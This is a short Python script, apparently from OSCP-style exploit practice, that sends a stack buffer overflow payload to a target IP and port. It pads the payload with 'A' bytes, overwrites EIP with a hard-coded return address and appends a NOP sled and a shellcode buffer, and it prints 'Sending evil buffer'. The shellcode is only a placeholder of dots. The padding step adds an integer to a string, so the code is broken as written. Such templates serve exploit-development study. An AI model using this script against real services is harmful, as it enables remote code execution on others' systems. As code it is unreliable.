#!/usr/bin/python

# Author: Tyler Bennett
# taken from various sources online and offsec
# I just wanted to make it less patch-work

from __future__ import print_function

import socket
import argparse

shellcode =  ""
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += ".............................."

def fuzz(args):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    crash = "A" * args.crash
    eip = args.eip
    nop = "\x90" * args.nop

    payload = (len(crash) + len(eip) + len(nop) + len(shellcode))
    padding = args.length - payload
    string = crash + eip + nop + shellcode + padding

    try:
        print("\nSending evil buffer...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _ = s.connect((args.address,args.port))
        s.send(string + '\r\n')
        s.close()
        print("\nDone!")
    except:
        print("Could not connect")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p','--port',required=True,type=int,help='port to fuzz')
    parser.add_argument('-ip','--address',required=True,help='IP Address to attack.  Default is 127.0.0.1',default='127.0.0.1')
    parser.add_argument('-c','--crash',required=True,type=int,help='Exact number of bytes to crash application; you should provide len(A), (A+):(EIP):(badchars)')
    parser.add_argument('-l','--length',required=True,type=int,help='Length of payload to send, provided number should be > (crash+eip+nop+shellcode), padding will be calculated. default=1000',default=1000)
    parser.add_argument('-e','--eip',required=True,help='Value to override EIP with; four byte BE address', default="\xf3\x12\x17\x31")
    parser.add_argument('-n','--nop',required=True,type=int,help='Number of NOPs to send, default is 60', default=60)
    args = parser.parse_args()
    fuzz(args)

if __name__=="__main__":
    main()
